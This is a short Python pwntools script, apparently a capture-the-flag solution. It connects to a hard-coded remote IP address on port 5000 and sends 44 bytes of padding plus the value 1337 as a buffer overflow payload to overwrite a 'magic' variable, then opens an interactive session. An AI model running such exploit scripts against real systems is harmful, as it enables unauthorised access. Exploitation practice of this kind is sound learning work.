#!/usr/bin/python3

from pwn import *

p = remote("143.198.184.186", 5000)

padding = "A"*44
magic = 1337

payload = padding.encode('utf-8')
payload += p64(magic)

p.sendlineafter("magic?:", payload)

p.interactive()
